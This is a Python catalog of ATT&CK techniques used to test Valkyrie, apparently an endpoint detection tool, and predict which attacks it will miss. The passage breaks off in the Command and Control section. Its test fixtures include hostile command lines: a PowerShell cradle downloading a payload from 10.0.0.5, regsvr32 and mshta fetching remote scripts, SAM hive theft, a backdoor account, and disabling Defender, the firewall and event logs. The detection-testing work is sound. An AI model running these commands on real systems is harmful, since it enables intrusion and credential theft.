"""The technique catalog — the single source of truth for this evaluation.

Every technique below was checked against Valkyrie's ACTUAL source before being
assigned a `delivery` and `predicted_tier_b` value. Nothing here is a guess
dressed up as an assessment. Where verification stopped short of a full trace,
`source_confidence` says so honestly instead of implying more rigor than exists.

## The finding that reshaped this catalog

Before writing this file, the obvious assumption was: "there's a named rule for
technique X in behavioral_rules.py, so Valkyrie detects X." Tracing the actual
call graph disproves that for most single-shot commands:

    Sysmon EID 1 (process creation, HAS the command line)
        -> etw/sysmon.py classify_process()     [name/path/parent ONLY]
        -> the CommandLine field is READ from the event but never forwarded
        -> classify_behavior() / match_process() -- the 32 named IOA rules --
           is NEVER CALLED from the Sysmon path at all.

    The ONLY caller of classify_behavior() is ProcInfo.to_event() in
    process_telemetry.py, which is fed exclusively by ProcessCollector -- a
    plain psutil poller on a 2.0-SECOND interval (process_telemetry.py:258,
    default interval=2.0). It enriches a process with its command line by
    calling psutil.Process.cmdline() on the NEXT poll tick after the process
    is first seen -- which requires the process to still be alive at that tick.

So the 32 rules that recognize `regsvr32 /i:http://.../scriptlet.sct`,
`rundll32 comsvcs.dll,MiniDump ... lsass.exe`, `wevtutil cl`,
`vssadmin delete shadows`, `Set-MpPreference -DisableRealtimeMonitoring $true`,
etc. are reachable ONLY if that one-shot command is still running ~2 seconds
after it started -- true or false ENTIRELY independent of whether Sysmon is
installed, because Sysmon's process-creation event never reaches this engine.
Native Windows utilities that run and exit in under a second (which is most of
them) will race this poller and typically lose.

This is not true of every path:
  * PERSISTENCE ARTIFACTS (registry Run keys, scheduled tasks, services,
    startup folder) are scanned by a SEPARATE poller (persistence_telemetry.py,
    15s interval) that reads the artifact's stored command from the registry/
    Task Scheduler AT REST -- it does not need the writing process to still be
    running. This path is genuinely reliable.
  * DNS/network decisions happen INLINE in the request path (dns_interceptor.py
    _decide, network_telemetry.classify_connection) -- no polling at all.
  * Sysmon EID 8 (CreateRemoteThread) and EID 10 (ProcessAccess -> lsass.exe)
    ARE wired to their own real-time classifiers directly in etw/sysmon.py --
    these two specific techniques (T1055, T1003.001) get genuine real-time
    coverage on a Sysmon-equipped host, independent of the poller.
  * ransomware_shield.py's canary + entropy watcher is an independent,
    purpose-built, real-time-ish detector -- not the general poller.

`delivery` below encodes which of these regimes a technique's detection
actually depends on, and it is what turns a "there's a rule for this" belief
into an honest DETECT / CONDITIONAL / MISS prediction.
"""

from __future__ import annotations

import sys
from pathlib import Path
from dataclasses import dataclass, field, asdict

CATALOG_VERSION = "2026-07-30.1"

# Delivery regimes, ordered roughly by reliability.
DELIVERY_REALTIME_ETW = "realtime_etw"          # Sysmon EID 8 / EID 10 direct wiring
DELIVERY_ARTIFACT_POLL = "artifact_poll_15s"    # persistence_telemetry.py, artifact at rest
DELIVERY_INLINE = "inline_request_path"         # DNS/network decision path, no polling
DELIVERY_PURPOSE_BUILT = "purpose_built_watcher"  # ransomware_shield canary/entropy
DELIVERY_PROCESS_POLL_RACY = "process_poll_2s_racy"  # the finding above
DELIVERY_NONE = "no_code_path"                  # genuinely nothing checks for this today

SOURCE_CONFIRMED = "confirmed_by_source_trace"
SOURCE_PARTIAL = "predicted_from_partial_verification"


@dataclass(frozen=True)
class Technique:
    id: str                      # catalog id, stable across catalog versions
    technique_id: str            # MITRE ATT&CK id, e.g. "T1547.001"
    technique_name: str
    tactic: str
    art_test_ref: str            # e.g. "Atomic Red Team T1547.001 Test #1"
    destructive: bool            # true if it alters system state non-trivially
    live_vm_safe: bool           # false => excluded even from the VM catalog
    out_of_scope_reason: str = ""  # non-empty overrides live_vm_safe to "excluded"
    delivery: str = DELIVERY_PROCESS_POLL_RACY
    detector_path: str = ""      # file:function that would need to fire
    predicted_tier_b: str = "CONDITIONAL"   # DETECT | CONDITIONAL | MISS
    source_confidence: str = SOURCE_PARTIAL
    probe: str = ""              # dispatch key into replay_harness.PROBES
    probe_input: dict = field(default_factory=dict)
    notes: str = ""
    # Non-empty => the real classifier fires, but under a DIFFERENT technique
    # than the one this test targets (an overbroad rule catching the wrong
    # thing). Such a hit is never credited as a correct detection of the
    # tested technique, even though `classifier_logic_fires` is True.
    known_mismatch: str = ""

    def in_scope(self) -> bool:
        return self.live_vm_safe and not self.out_of_scope_reason

    def as_dict(self) -> dict:
        return asdict(self)


# =============================================================================
# EXECUTION
# =============================================================================
EXECUTION = [
    Technique(
        id="exec-powershell-encoded", technique_id="T1059.001",
        technique_name="Command and Scripting Interpreter: PowerShell",
        tactic="Execution", art_test_ref="T1059.001 Test #2 (EncodedCommand)",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_PROCESS_POLL_RACY,
        detector_path="valkyrie/etw/powershell.py:classify_powershell "
                       "(real-time IF PS Script Block Logging/ETW is wired; "
                       "process-launch path is the 2s-poll racy fallback)",
        predicted_tier_b="CONDITIONAL",
        source_confidence=SOURCE_CONFIRMED,
        probe="powershell", probe_input={
            "script_block": "IEX (New-Object Net.WebClient).DownloadString("
                            "'http://10.0.0.5/payload.ps1')"},
        notes="classify_powershell is real-time when fed PS Script Block "
              "Logging (event 4104), which provision.ps1 enables. Without it, "
              "falls back to the racy process poller for the launching "
              "powershell.exe cmdline.",
    ),
    Technique(
        id="exec-cmd-office-child", technique_id="T1059.003",
        technique_name="Command and Scripting Interpreter: Windows Command Shell",
        tactic="Execution", art_test_ref="T1059.003 Test #1 (cmd spawned by Office)",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_PROCESS_POLL_RACY,
        detector_path="valkyrie/process_telemetry.py:classify_process "
                       "(_OFFICE parent + _SHELLS child rule)",
        predicted_tier_b="CONDITIONAL",
        source_confidence=SOURCE_CONFIRMED,
        probe="process_relationship",
        probe_input={"name": "cmd.exe", "path": r"C:\Windows\System32\cmd.exe",
                     "parent": "winword.exe"},
        notes="cmd.exe from Office typically stays alive briefly (running the "
              "actual payload) so the 2s poll has a real chance to catch it -- "
              "materially better odds than a single native utility that exits "
              "immediately.",
    ),
    Technique(
        id="exec-mshta-remote", technique_id="T1218.005",
        technique_name="System Binary Proxy Execution: Mshta",
        tactic="Execution", art_test_ref="T1218.005 Test #1 (remote HTA)",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_PROCESS_POLL_RACY,
        detector_path="valkyrie/behavioral_rules.py: mshta-remote rule "
                       "(reachable only via the 2s process-poll cmdline path)",
        predicted_tier_b="MISS", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "mshta.exe", "parent": "explorer.exe",
            "cmdline": "mshta.exe http://10.0.0.5/evil.hta", "path": ""},
        notes="mshta.exe held open by the loaded HTA can persist beyond 2s in "
              "many real payloads, which is the one thing that could save this "
              "in practice -- but the base ART atomic (calc.hta) exits "
              "immediately, so the honest default prediction is MISS.",
    ),
    Technique(
        id="exec-regsvr32-squiblydoo", technique_id="T1218.010",
        technique_name="System Binary Proxy Execution: Regsvr32 (Squiblydoo)",
        tactic="Execution", art_test_ref="T1218.010 Test #1",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_PROCESS_POLL_RACY,
        detector_path="valkyrie/behavioral_rules.py: regsvr32-scriptlet rule",
        predicted_tier_b="MISS", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "regsvr32.exe", "parent": "cmd.exe",
            "cmdline": "regsvr32.exe /s /n /u /i:http://10.0.0.5/file.sct "
                       "scrobj.dll", "path": ""},
        notes="regsvr32 with /u /i:<url> exits in well under 2s. This is the "
              "headline case for the classify_behavior/Sysmon wiring gap: even "
              "with Sysmon installed and EID1 firing, the CommandLine field is "
              "discarded before reaching this rule.",
    ),
    Technique(
        id="exec-rundll32-proxy", technique_id="T1218.011",
        technique_name="System Binary Proxy Execution: Rundll32",
        tactic="Execution", art_test_ref="T1218.011 Test #1",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_PROCESS_POLL_RACY,
        detector_path="valkyrie/behavioral_rules.py: rundll32-proxy rule",
        predicted_tier_b="MISS", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "rundll32.exe", "parent": "cmd.exe",
            "cmdline": r"rundll32.exe C:\Users\Public\evil.dll,EntryPoint",
            "path": ""},
        notes="Same wiring gap as regsvr32.",
    ),
    Technique(
        id="exec-wmic-process-call", technique_id="T1047",
        technique_name="Windows Management Instrumentation (local process create)",
        tactic="Execution", art_test_ref="T1047 Test #1 (wmic process call create)",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_PROCESS_POLL_RACY,
        detector_path="valkyrie/behavioral_rules.py: wmic-process-call rule",
        predicted_tier_b="MISS", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "wmic.exe", "parent": "cmd.exe",
            "cmdline": 'wmic.exe process call create "cmd.exe /c calc.exe"',
            "path": ""},
        notes="wmic.exe exits almost instantly. Same wiring gap.",
    ),
    Technique(
        id="exec-lure-doubleext", technique_id="T1204.002",
        technique_name="User Execution: Malicious File (double-extension lure)",
        tactic="Execution", art_test_ref="T1204.002 (manual masquerade construction)",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_PROCESS_POLL_RACY,
        detector_path="valkyrie/behavior_score.py:score_process "
                       "(_LURE_STEMS/_EXE_TAILS + bidi-override masquerade)",
        predicted_tier_b="CONDITIONAL", source_confidence=SOURCE_CONFIRMED,
        probe="behavior_score", probe_input={
            "image": "invoice_2026\u202egpj.exe",
            "parent": "explorer.exe",
            "cmdline": r"C:\Users\bob\Downloads\invoice_2026\u202egpj.exe",
            "path": r"C:\Users\bob\Downloads\invoice_2026\u202egpj.exe"},
        notes="score_process is a pure function reachable the same way as the "
              "IOA engine (via ProcInfo.to_event(), same 2s-poll dependency) -- "
              "BUT a double-extension dropper is typically launched by the user "
              "and does something (drops a payload, opens a decoy document), "
              "which buys enough runtime for the poller to have a real chance. "
              "Conditional, not a clean DETECT.",
    ),
]

# =============================================================================
# PERSISTENCE  -- the genuinely reliable tactic, and it shows in the predictions
# =============================================================================
PERSISTENCE = [
    Technique(
        id="persist-run-key", technique_id="T1547.001",
        technique_name="Boot or Logon Autostart Execution: Registry Run Keys",
        tactic="Persistence", art_test_ref="T1547.001 Test #1",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_ARTIFACT_POLL,
        detector_path="valkyrie/persistence_telemetry.py:_persistence_severity "
                       "via PersistenceCollector (15s artifact-at-rest scan)",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="persistence", probe_input={
            "activity": "run_key",
            "command": r'C:\Users\Public\update.exe -silent'},
        notes="The artifact sits in the registry until removed -- the scanner "
              "does not need to catch a live process. This is Valkyrie's most "
              "reliable non-network detection path.",
    ),
    Technique(
        id="persist-scheduled-task", technique_id="T1053.005",
        technique_name="Scheduled Task/Job: Scheduled Task",
        tactic="Persistence", art_test_ref="T1053.005 Test #1",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_ARTIFACT_POLL,
        detector_path="valkyrie/persistence_telemetry.py (scheduled task ASEP)",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="persistence", probe_input={
            "activity": "scheduled_task",
            "command": r'powershell.exe -enc SQBFAFgA...'},
        notes="Encoded PowerShell in the task action also trips "
              "classify_cmdline's encoded_powershell signal, escalating "
              "severity beyond the baseline MEDIUM.",
    ),
    Technique(
        id="persist-new-service", technique_id="T1543.003",
        technique_name="Create or Modify System Process: Windows Service",
        tactic="Persistence", art_test_ref="T1543.003 Test #1",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_ARTIFACT_POLL,
        detector_path="valkyrie/persistence_telemetry.py (service ASEP)",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="persistence", probe_input={
            "activity": "service",
            "command": r'C:\Users\Public\svc.exe'},
        notes="Suspicious-path binary (Public\\) escalates to HIGH via the "
              "_SUSPICIOUS_PATHS check independent of cmdline content.",
    ),
    Technique(
        id="persist-startup-folder", technique_id="T1547.001",
        technique_name="Boot or Logon Autostart Execution: Startup Folder",
        tactic="Persistence", art_test_ref="T1547.001 Test #9 (Startup folder)",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_ARTIFACT_POLL,
        detector_path="valkyrie/persistence_telemetry.py (startup folder ASEP)",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="persistence", probe_input={
            "activity": "startup_folder",
            "command": r'C:\Users\bob\AppData\Roaming\Microsoft\Windows\Start '
                       r'Menu\Programs\Startup\update.exe'},
        notes="",
    ),
    Technique(
        id="persist-local-account", technique_id="T1136.001",
        technique_name="Create Account: Local Account",
        tactic="Persistence", art_test_ref="T1136.001 Test #1 (net user /add)",
        destructive=True, live_vm_safe=True,
        delivery=DELIVERY_PROCESS_POLL_RACY,
        detector_path="valkyrie/behavioral_rules.py: create-local-account rule "
                       "-- NOT backed by any artifact-at-rest scan of local "
                       "accounts (unlike registry/task/service persistence)",
        predicted_tier_b="MISS", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "net.exe", "parent": "cmd.exe",
            "cmdline": "net user backdoor P@ssw0rd123! /add", "path": ""},
        notes="A named rule exists but there is no independent local-account "
              "poller the way there is for registry/task/service ASEPs -- this "
              "one depends entirely on catching net.exe alive, and net.exe "
              "exits immediately. Same class of gap as the Execution misses, "
              "compounded by having no artifact-at-rest fallback.",
    ),
    Technique(
        id="persist-wmi-subscription", technique_id="T1546.003",
        technique_name="Event Triggered Execution: WMI Event Subscription",
        tactic="Persistence", art_test_ref="T1546.003 Test #1",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_PROCESS_POLL_RACY,
        detector_path="valkyrie/behavioral_rules.py rule exists; "
                       "valkyrie/etw/wmi.py:classify_wmi exists but end-to-end "
                       "live wiring to a WMI-Activity ETW consumer NOT traced",
        predicted_tier_b="CONDITIONAL", source_confidence=SOURCE_PARTIAL,
        probe="ioa_rule", probe_input={
            "image": "wmic.exe", "parent": "cmd.exe",
            "cmdline": 'wmic.exe /NAMESPACE:"\\\\root\\subscription" PATH '
                       '__EventFilter CREATE Name="fltr", ...', "path": ""},
        notes="Marked CONDITIONAL rather than MISS because classify_wmi's live "
              "data source was not confirmed end-to-end -- flagged for "
              "confirmation during the VM pass rather than asserted either way.",
    ),
]

# =============================================================================
# DEFENSE EVASION
# =============================================================================
DEFENSE_EVASION = [
    Technique(
        id="evasion-defender-disable", technique_id="T1562.001",
        technique_name="Impair Defenses: Disable or Modify Tools (Defender)",
        tactic="Defense Evasion",
        art_test_ref="T1562.001 Test #1 (Set-MpPreference -DisableRealtimeMonitoring)",
        destructive=True, live_vm_safe=True,
        delivery=DELIVERY_PROCESS_POLL_RACY,
        detector_path="valkyrie/behavioral_rules.py: defender-disable rule",
        predicted_tier_b="CONDITIONAL", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "powershell.exe", "parent": "cmd.exe",
            "cmdline": "powershell.exe Set-MpPreference "
                       "-DisableRealtimeMonitoring $true", "path": ""},
        notes="CONDITIONAL not MISS: PowerShell process lifetime for a cmdlet "
              "call is longer than a bare native exe and PS Script Block "
              "Logging (event 4104, provisioned) gives a SECOND, real-time "
              "path via etw/powershell.py independent of the racy poller.",
    ),
    Technique(
        id="evasion-clear-eventlogs", technique_id="T1070.001",
        technique_name="Indicator Removal: Clear Windows Event Logs",
        tactic="Defense Evasion", art_test_ref="T1070.001 Test #1 (wevtutil cl)",
        destructive=True, live_vm_safe=True,
        delivery=DELIVERY_PROCESS_POLL_RACY,
        detector_path="valkyrie/behavioral_rules.py rule exists for wevtutil",
        predicted_tier_b="MISS", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "wevtutil.exe", "parent": "cmd.exe",
            "cmdline": "wevtutil.exe cl Security", "path": ""},
        notes="wevtutil cl completes in milliseconds. No Sysmon backstop "
              "exists for this technique specifically (unlike T1055/T1003.001) "
              "since Sysmon EID1 doesn't forward cmdline. Ironically, clearing "
              "the WINDOWS event log does not touch Valkyrie's own SQLite "
              "store, so this atomic being 'successful' does not blind "
              "Valkyrie generally -- it just isn't detected AS an evasion act.",
    ),
    Technique(
        id="evasion-encoded-powershell", technique_id="T1027",
        technique_name="Obfuscated Files or Information: PowerShell -EncodedCommand",
        tactic="Defense Evasion", art_test_ref="T1027 Test #3",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_ARTIFACT_POLL,   # scored via the persistence path here
        detector_path="valkyrie/process_telemetry.py:classify_cmdline "
                       "(_ENCODED_PS signal) -- called from BOTH the racy poll "
                       "path and the reliable persistence-artifact path",
        predicted_tier_b="CONDITIONAL", source_confidence=SOURCE_CONFIRMED,
        probe="cmdline", probe_input={
            "name": "powershell.exe",
            "cmdline": "powershell.exe -enc "
                       "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"},
        notes="Scored CONDITIONAL because classify_cmdline is reachable via "
              "two different paths with different reliability -- reliable when "
              "encoded via a persistence artifact, racy when it is a one-shot "
              "interactive launch.",
    ),
    Technique(
        id="evasion-certutil-decode", technique_id="T1140",
        technique_name="Deobfuscate/Decode Files or Information (certutil -decode)",
        tactic="Defense Evasion", art_test_ref="T1140 Test #1",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_PROCESS_POLL_RACY,
        detector_path="valkyrie/behavioral_rules.py: T1140 rule",
        predicted_tier_b="MISS", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "certutil.exe", "parent": "cmd.exe",
            "cmdline": "certutil.exe -decode payload.b64 payload.exe",
            "path": ""},
        notes="Same class of gap as regsvr32/rundll32/wmic.",
    ),
    Technique(
        id="evasion-firewall-disable", technique_id="T1562.004",
        technique_name="Impair Defenses: Disable or Modify System Firewall",
        tactic="Defense Evasion",
        art_test_ref="T1562.004 Test #1 (netsh advfirewall set allprofiles state off)",
        destructive=True, live_vm_safe=True,
        delivery=DELIVERY_PROCESS_POLL_RACY,
        detector_path="valkyrie/behavioral_rules.py: T1562.004 rule",
        predicted_tier_b="MISS", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "netsh.exe", "parent": "cmd.exe",
            "cmdline": "netsh advfirewall set allprofiles state off",
            "path": ""},
        notes="Same class of gap. Also directly relevant to Valkyrie's own "
              "firewall pillar being tampered with.",
    ),
    Technique(
        id="evasion-process-injection", technique_id="T1055",
        technique_name="Process Injection (CreateRemoteThread)",
        tactic="Defense Evasion", art_test_ref="T1055.002 Test #1",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/etw/sysmon.py:classify_sysmon EID 8 -- direct, "
                       "real-time, NOT dependent on the process poller",
        predicted_tier_b="CONDITIONAL", source_confidence=SOURCE_CONFIRMED,
        probe="sysmon_eid8", probe_input={
            "SourceImage": r"C:\Windows\System32\rundll32.exe",
            "SourceProcessId": "4321",
            "TargetImage": r"C:\Windows\System32\notepad.exe",
            "TargetProcessId": "5555"},
        notes="Genuinely CONDITIONAL rather than MISS -- but the condition is "
              "binary and absolute: Sysmon must be installed. No kernel-driver "
              "fallback exists (driver has never been compiled -- see "
              "docs/adr/0026). On a bare Windows host with no Sysmon, this is "
              "a hard MISS with zero visibility, not a degraded detection.",
    ),
]

# =============================================================================
# CREDENTIAL ACCESS
# =============================================================================
CREDENTIAL_ACCESS = [
    Technique(
        id="cred-lsass-comsvcs", technique_id="T1003.001",
        technique_name="OS Credential Dumping: LSASS Memory (comsvcs MiniDump)",
        tactic="Credential Access", art_test_ref="T1003.001 Test #3",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/etw/sysmon.py:classify_sysmon EID 10 "
                       "(ProcessAccess -> lsass.exe) -- direct, real-time",
        predicted_tier_b="CONDITIONAL", source_confidence=SOURCE_CONFIRMED,
        probe="sysmon_eid10", probe_input={
            "SourceImage": r"C:\Windows\System32\rundll32.exe",
            "TargetImage": r"C:\Windows\System32\lsass.exe",
            "GrantedAccess": "0x1fffff"},
        notes="Same Sysmon-required caveat as T1055. The cmdline rule "
              "('comsvcs-minidump') is ALSO racy/likely-miss on its own -- "
              "EID 10 is what actually saves this technique.",
    ),
    Technique(
        id="cred-lsass-procdump", technique_id="T1003.001",
        technique_name="OS Credential Dumping: LSASS Memory (procdump)",
        tactic="Credential Access", art_test_ref="T1003.001 Test #1",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_REALTIME_ETW,
        detector_path="Same EID 10 path as above",
        predicted_tier_b="CONDITIONAL", source_confidence=SOURCE_CONFIRMED,
        probe="sysmon_eid10", probe_input={
            "SourceImage": r"C:\Users\Public\procdump.exe",
            "TargetImage": r"C:\Windows\System32\lsass.exe",
            "GrantedAccess": "0x1fffff"},
        notes="",
    ),
    Technique(
        id="cred-sam-dump", technique_id="T1003.002",
        technique_name="OS Credential Dumping: Security Account Manager",
        tactic="Credential Access",
        art_test_ref="T1003.002 Test #1 (reg save HKLM\\SAM)",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_PROCESS_POLL_RACY,
        detector_path="valkyrie/behavioral_rules.py: T1003.002 rule",
        predicted_tier_b="MISS", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "reg.exe", "parent": "cmd.exe",
            "cmdline": r"reg.exe save hklm\sam C:\Users\Public\sam.hive",
            "path": ""},
        notes="No Sysmon ProcessAccess equivalent for registry-hive save (EID "
              "10 is process-handle-access only, not registry API calls). "
              "Real gap with no existing partial mitigation.",
    ),
    Technique(
        id="cred-browser-stores", technique_id="T1555",
        technique_name="Credentials from Password Stores",
        tactic="Credential Access", art_test_ref="T1555.003 Test #1 (browser creds)",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_PROCESS_POLL_RACY,
        detector_path="valkyrie/behavioral_rules.py: T1555 rule",
        predicted_tier_b="MISS", source_confidence=SOURCE_PARTIAL,
        probe="ioa_rule", probe_input={
            "image": "powershell.exe", "parent": "cmd.exe",
            "cmdline": r"powershell.exe Get-Content "
                       r"'$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
                       r"\Login Data'", "path": ""},
        notes="",
    ),
]

# =============================================================================
# DISCOVERY -- a real, confirmed, structural gap (not merely timing)
# =============================================================================
DISCOVERY = [
    Technique(
        id="disc-whoami-priv", technique_id="T1033",
        technique_name="System Owner/User Discovery (whoami /priv)",
        tactic="Discovery", art_test_ref="T1033 Test #1",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_PROCESS_POLL_RACY,
        detector_path="valkyrie/behavioral_rules.py: T1033 rule (LOW severity)",
        predicted_tier_b="MISS", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "whoami.exe", "parent": "cmd.exe",
            "cmdline": "whoami.exe /priv", "path": ""},
        notes="whoami.exe exits in single-digit milliseconds. This is the "
              "case the OLD redteam/README already called 'LIKELY MISS' -- "
              "confirmed by this trace, and now understood to be the general "
              "case for every single-shot discovery command, not a one-off.",
    ),
    Technique(
        id="disc-systeminfo", technique_id="T1082",
        technique_name="System Information Discovery (systeminfo.exe)",
        tactic="Discovery", art_test_ref="T1082 Test #1",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_NONE,
        detector_path="NONE -- no rule, no label, no signal anywhere for "
                       "systeminfo.exe",
        predicted_tier_b="MISS", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "systeminfo.exe", "parent": "cmd.exe",
            "cmdline": "systeminfo.exe", "path": ""},
        notes="No named rule exists at all -- unlike the timing-gap misses "
              "above, this is a genuine coverage hole, not a wiring hole.",
    ),
    Technique(
        id="disc-tasklist", technique_id="T1057",
        technique_name="Process Discovery (tasklist.exe)",
        tactic="Discovery", art_test_ref="T1057 Test #1",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_NONE, detector_path="NONE",
        predicted_tier_b="MISS", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "tasklist.exe", "parent": "cmd.exe",
            "cmdline": "tasklist.exe /v", "path": ""},
        notes="",
    ),
    Technique(
        id="disc-net-view", technique_id="T1018",
        technique_name="Remote System Discovery (net view)",
        tactic="Discovery", art_test_ref="T1018 Test #1",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_NONE, detector_path="NONE",
        predicted_tier_b="MISS", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "net.exe", "parent": "cmd.exe",
            "cmdline": "net view /all", "path": ""},
        notes="",
    ),
    Technique(
        id="disc-local-accounts", technique_id="T1087.001",
        technique_name="Account Discovery: Local Account (net user)",
        tactic="Discovery", art_test_ref="T1087.001 Test #1",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_PROCESS_POLL_RACY,
        detector_path="valkyrie/behavioral_rules.py -- no rule fires on bare "
                       "'net user' as of the fix below; T1087.001 discovery "
                       "genuinely has no code path (see root_cause.py).",
        predicted_tier_b="MISS", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "net.exe", "parent": "cmd.exe",
            "cmdline": "net user", "path": ""},
        notes="FOUND AND FIXED during this evaluation, not merely predicted: "
              "the FIRST Tier A run (before the fix) showed this bare "
              "discovery command incorrectly firing the T1136.001 'Create "
              "Local Account' rule -- net-user-add matched on the substring "
              "'net user' with no /add required, so listing accounts and "
              "creating a backdoor account were indistinguishable. Fixed in "
              "valkyrie/behavioral_rules.py (now requires cmd_all=('net "
              "user','/add')); tests/test_behavioral_rules.py carries the "
              "regression control. Re-running Tier A after the fix confirms "
              "classifier_logic_fires is now correctly False for this input "
              "-- this entry is scored MISS not because of a bug but "
              "because T1087.001 discovery genuinely has no detection path, "
              "per the Discovery-tactic design note in root_cause.py.",
    ),
    Technique(
        id="disc-domain-trust", technique_id="T1482",
        technique_name="Domain Trust Discovery (nltest)",
        tactic="Discovery", art_test_ref="T1482 Test #1",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_PROCESS_POLL_RACY,
        detector_path="valkyrie/behavioral_rules.py: T1482 rule EXISTS "
                       "(the one discovery technique with a named rule)",
        predicted_tier_b="MISS", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "nltest.exe", "parent": "cmd.exe",
            "cmdline": "nltest.exe /domain_trusts /all_trusts", "path": ""},
        notes="Rule exists, unlike the other Discovery entries -- but suffers "
              "the identical poller race, so the prediction is still MISS. "
              "Requires a domain-joined host to test authentically.",
    ),
]

# =============================================================================
# LATERAL MOVEMENT -- structurally hard to test with one VM; said honestly
# =============================================================================
LATERAL_MOVEMENT = [
    Technique(
        id="lat-psexec-smb", technique_id="T1021.002",
        technique_name="Remote Services: SMB/Windows Admin Shares (PsExec)",
        tactic="Lateral Movement", art_test_ref="T1021.002 Test #1 (self-target)",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_PROCESS_POLL_RACY,
        detector_path="valkyrie/behavioral_rules.py: T1021.002 rule",
        predicted_tier_b="CONDITIONAL", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "psexesvc.exe", "parent": "services.exe",
            "cmdline": r"C:\Windows\PSEXESVC.exe", "path": ""},
        notes="PARTIAL FIDELITY ON ONE VM: real lateral movement needs a "
              "second host; a self-target run only proves the tool/service "
              "signature is recognised, not that cross-host movement is "
              "detected. PsExec's remote service tends to run longer than a "
              "bare native command, which is why this is CONDITIONAL rather "
              "than a flat MISS despite the racy poller.",
    ),
    Technique(
        id="lat-wmi-remote", technique_id="T1047",
        technique_name="Windows Management Instrumentation (remote node)",
        tactic="Lateral Movement",
        art_test_ref="T1047 Test #3 (wmic /node: remote, self-target)",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_PROCESS_POLL_RACY,
        detector_path="valkyrie/behavioral_rules.py: wmic-remote-node rule",
        predicted_tier_b="MISS", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "wmic.exe", "parent": "cmd.exe",
            "cmdline": 'wmic.exe /node:"target" process call create "calc.exe"',
            "path": ""},
        notes="SAME single-VM caveat as above. wmic exits immediately -> MISS.",
    ),
    Technique(
        id="lat-tool-transfer", technique_id="T1570",
        technique_name="Lateral Tool Transfer",
        tactic="Lateral Movement",
        art_test_ref="T1570 (copy via admin share, self-target)",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_NONE, detector_path="NONE",
        predicted_tier_b="MISS", source_confidence=SOURCE_PARTIAL,
        probe="ioa_rule", probe_input={
            "image": "cmd.exe", "parent": "explorer.exe",
            "cmdline": r"copy C:\tool.exe \\target\C$\Windows\Temp\tool.exe",
            "path": ""},
        notes="No rule found for file-copy-to-admin-share patterns. SAME "
              "single-VM caveat -- genuinely needs two hosts.",
    ),
]

# =============================================================================
# COMMAND AND CONTROL -- Valkyrie's strongest tactic, and it shows
# =============================================================================
COMMAND_AND_CONTROL = [
    Technique(
        id="c2-dns-tracker-domain", technique_id="T1071.004",
        technique_name="Application Layer Protocol: DNS (query to a known tracker)",
        tactic="Command and Control",
        art_test_ref="Custom -- DNS resolution to an EasyPrivacy-listed domain",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_INLINE,
        detector_path="valkyrie/dns_interceptor.py:_decide -> "
                       "site_scanner / blocklist (curated list, NOT a "
                       "user-defined rule -- see scoring note)",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="dns", probe_input={"domain": "doubleclick.net",
                                  "process": "chrome.exe"},
        notes="SCORING NOTE: this fires via Valkyrie's own curated blocklist, "
